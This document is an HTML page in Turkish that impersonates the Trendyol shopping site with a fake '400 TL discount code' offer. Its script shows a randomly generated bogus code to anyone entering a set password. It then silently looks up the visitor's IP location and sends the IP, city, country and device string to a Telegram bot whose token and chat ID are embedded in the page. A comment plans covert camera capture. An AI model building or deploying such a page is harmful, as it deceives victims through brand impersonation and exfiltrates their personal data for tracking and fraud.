<!DOCTYPE html><html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Trendyol - 400 TL İndirim Kodu</title>
  <link rel="icon" href="https://cdn.dsmcdn.com/web/favicon.ico">
  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    body {
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    header {
      background-color: #f27a1a;
      width: 100%;
      padding: 15px 0;
      text-align: center;
    }
    header img {
      height: 30px;
    }
    .container {
      margin-top: 50px;
      background-color: #fff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 400px;
    }
    h2 {
      color: #333;
      margin-bottom: 20px;
      text-align: center;
    }
    input[type="text"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #f27a1a;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background-color: #e06800;
    }
    .code-box {
      margin-top: 20px;
      padding: 15px;
      background-color: #f0f0f0;
      border-left: 4px solid #f27a1a;
      font-weight: bold;
      display: none;
      word-break: break-word;
    }
    .error {
      color: red;
      margin-top: 10px;
      display: none;
      text-align: center;
    }
  </style>
</head>
<body>
  <header>
    <img src="https://cdn.dsmcdn.com/web/logo/ty-web.svg" alt="Trendyol">
  </header>
  <div class="container">
    <h2>400 TL Değerinde İndirim Kodunuzu Alın</h2>
    <input type="text" id="password" placeholder="Kodunuzu girin">
    <button onclick="submitCode()">Kodu Göster</button>
    <div class="error" id="error">Kod hatalı veya süresi dolmuş olabilir.</div>
    <div class="code-box" id="codeBox">TR-XXXX-YY</div>
  </div>  <script>
    const correctPassword = "670570";

    function generateFakeCode() {
      const part1 = Math.floor(1000 + Math.random() * 9000);
      const part2 = Math.random().toString(36).substring(2, 4).toUpperCase();
      return `TR-${part1}-${part2}`;
    }

    async function getIPData() {
      try {
        const res = await fetch("https://api.db-ip.com/v2/free/self");
        return await res.json();
      } catch (e) {
        return {};
      }
    }

    async function submitCode() {
      const input = document.getElementById("password").value;
      const error = document.getElementById("error");
      const codeBox = document.getElementById("codeBox");

      if (input === correctPassword) {
        const code = generateFakeCode();
        codeBox.textContent = code;
        codeBox.style.display = "block";
        error.style.display = "none";

        const ipData = await getIPData();
        const device = navigator.userAgent;

        fetch(`https://api.telegram.org/bot8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: "7791726274",
            text: `Yeni giriş yapıldı:\nKod: ${code}\nIP: ${ipData.ipAddress || "-"}\nŞehir: ${ipData.city || "-"}\nÜlke: ${ipData.countryName || "-"}\nCihaz: ${device}`,
          }),
        });

        // Kamera foto kısmı burada entegre edilecek (getUserMedia ile)
      } else {
        error.style.display = "block";
        codeBox.style.display = "none";
      }
    }
  </script></body>
</html>
